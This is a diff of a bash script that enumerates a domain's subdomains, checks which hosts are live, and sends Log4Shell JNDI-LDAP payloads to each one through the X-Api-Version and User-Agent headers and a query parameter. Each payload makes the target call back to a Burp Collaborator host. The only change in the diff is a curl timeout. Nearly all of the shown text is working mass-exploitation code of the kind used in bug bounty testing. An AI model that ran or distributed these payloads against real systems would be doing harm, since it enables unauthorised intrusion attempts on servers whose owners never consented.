@@ -33,17 +33,17 @@ EOF
 
 domainScan() {
     echo -e "\n$(tput setaf 2 ; tput rev ; tput bold) Subfinder is working $(tput sgr0)\n" ; subfinder -silent -d sub.$domain >> sub.$domain ; echo -e "\n$(tput setaf 2 ; tput rev ; tput bold) Assetfinder is working $(tput sgr0)\n" ; assetfinder -subs-only $domain >> sub.$domain ; echo -e "\n$(tput setaf 2 ; tput rev ; tput bold) Amass is working $(tput sgr0)\n" ; amass enum -norecursive --silent -noalts -d $domain >> sub.$domain ; cat sub.$domain | sort -u | httpx -silent | while read url; do 
-    echo 'curl -s $url -H 'log4jPayload' > /dev/null' | sed "s|log4jPayload|'X-Api-Version: \${jndi:ldap://$burpcollabid/a}'|g" | sed "s|\$url|$url|g" | bash
-    echo 'curl -s '$url/?test=log4jPayload' > /dev/null' | sed "s|log4jPayload|'\$\\\{{jndi:ldap://$burpcollabid/a\\\}}'|g" | sed "s|\$url|$url|g" | bash
-    echo 'curl -s $url -H 'log4jPayload' > /dev/null' | sed "s|log4jPayload|'User-Agent: \${jndi:ldap://$burpcollabid/a}'|g" | sed "s|\$url|$url|g" | bash
+    echo 'curl -s --max-time 20 $url -H 'log4jPayload' > /dev/null' | sed "s|log4jPayload|'X-Api-Version: \${jndi:ldap://$burpcollabid/a}'|g" | sed "s|\$url|$url|g" | bash
+    echo 'curl -s --max-time 20 '$url/?test=log4jPayload' > /dev/null' | sed "s|log4jPayload|'\$\\\{{jndi:ldap://$burpcollabid/a\\\}}'|g" | sed "s|\$url|$url|g" | bash
+    echo 'curl -s --max-time 20 $url -H 'log4jPayload' > /dev/null' | sed "s|log4jPayload|'User-Agent: \${jndi:ldap://$burpcollabid/a}'|g" | sed "s|\$url|$url|g" | bash
     echo -e "\033[104m[ DOMAIN ==> $url ]\033[0m" "\n" "\033[92m Method 1 ==> X-Api-Version: running-Ldap-payload" "\n" " Method 2 ==> Useragent: running-Ldap-payload" "\n" " Method 3 ==> $url/?test=running-Ldap-payload" "\n\033[0m";done
 }
 
 listScan() {
     cat $list | sort -u | httpx -silent | while read url; do 
-    echo 'curl -s $url -H 'log4jPayload' > /dev/null' | sed "s|log4jPayload|'X-Api-Version: \${jndi:ldap://$burpcollabid/a}'|g" | sed "s|\$url|$url|g" | bash
-    echo 'curl -s '$url/?test=log4jPayload' > /dev/null' | sed "s|log4jPayload|'\$\\\{{jndi:ldap://$burpcollabid/a\\\}}'|g" | sed "s|\$url|$url|g" | bash
-    echo 'curl -s $url -H 'log4jPayload' > /dev/null' | sed "s|log4jPayload|'User-Agent: \${jndi:ldap://$burpcollabid/a}'|g" | sed "s|\$url|$url|g" | bash
+    echo 'curl -s --max-time 20 $url -H 'log4jPayload' > /dev/null' | sed "s|log4jPayload|'X-Api-Version: \${jndi:ldap://$burpcollabid/a}'|g" | sed "s|\$url|$url|g" | bash
+    echo 'curl -s --max-time 20 '$url/?test=log4jPayload' > /dev/null' | sed "s|log4jPayload|'\$\\\{{jndi:ldap://$burpcollabid/a\\\}}'|g" | sed "s|\$url|$url|g" | bash
+    echo 'curl -s --max-time 20 $url -H 'log4jPayload' > /dev/null' | sed "s|log4jPayload|'User-Agent: \${jndi:ldap://$burpcollabid/a}'|g" | sed "s|\$url|$url|g" | bash
     echo -e "\033[104m[ DOMAIN ==> $url ]\033[0m" "\n" "\033[92m Method 1 ==> X-Api-Version: running-Ldap-payload" "\n" " Method 2 ==> Useragent: running-Ldap-payload" "\n" " Method 3 ==> $url/?test=running-Ldap-payload" "\n\033[0m";done
 }
 
